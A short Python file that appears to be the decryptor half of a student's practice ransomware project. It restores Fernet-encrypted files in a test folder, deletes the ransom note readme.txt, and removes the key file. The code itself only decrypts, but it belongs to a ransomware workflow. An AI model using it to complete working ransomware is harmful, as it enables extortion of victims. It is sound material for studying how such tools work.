from cryptography.fernet import Fernet
import os

# SYMMETRIC DECRYPTION BASIC FUNCTIONING

#--------------------------------load key------------------------------
# we'll need the same key so the function to load it is the same
def load_key():
    is_key = os.path.dirname(os.path.abspath(__file__))+'\\'+'key.key'
    return open(is_key, 'rb').read() #open the key in read binary mode and then read it

# print(load_key())

#--------------------------------decryption------------------------------

def decrypt(items, key):  #(files to decrypt, key)
    f = Fernet(key)  # using fernet method
    for item in items:  # for every item on the directory
        with open(item, 'rb') as file:  # having opened the file in read binary mode,
            encrypted_data = file.read()   # save the data of the file in the variable
        decrypted_data = f.decrypt(encrypted_data)  #decrypt the variable with fernet
        with open(item, 'wb') as file:  # then having the file opened anew in write binary mode,
            file.write(decrypted_data)  # rewrite the decrypted data 
# basically same that before but backwards

if __name__ == '__main__':   # https://www.geeksforgeeks.org/what-does-the-if-__name__-__main__-do/  ; https://stackoverflow.com/questions/419163/what-does-if-name-main-do
    # this is the main program so this condition is true and the code will be executed.

    # still got to discover how to get username xd

    path_to_encrypt = 'C:\\Users\\RitaAlonsoCasablanca\\Desktop\\malware\\ransomware_versions_test\\dir'
    os.remove(path_to_encrypt+'\\'+'readme.txt') # remove the ransom file

    items = os.listdir(path_to_encrypt)  #store in the variable items the items that exist in the path, listed by the function listdir 
    full_path = [path_to_encrypt+'\\'+item for item in items]  # this stores the path to every single element of the directory to decrypt ()
    # using list comprehension method, we have the first path, and then a for bucle that adds an element to the list for every item in items (that is, for every file in the directory)

    #call the functions previously created
    key = load_key()
    decrypt(full_path, key)

    is_key = os.path.dirname(os.path.abspath(__file__))+'\\'+'key.key'
    os.remove(is_key) # remove the key file


'''
path_to_encrypt = 'C:\\Users\\RitaAlonsoCasablanca\\Desktop\\malware\\ransomware_versions_test\\dir'
items = os.listdir(path_to_encrypt)  #store in the variable items the items that exist in the path, listed by the function listdir 
full_path = [path_to_encrypt+'\\'+item for item in items]

print(items)
print(full_path)


'''
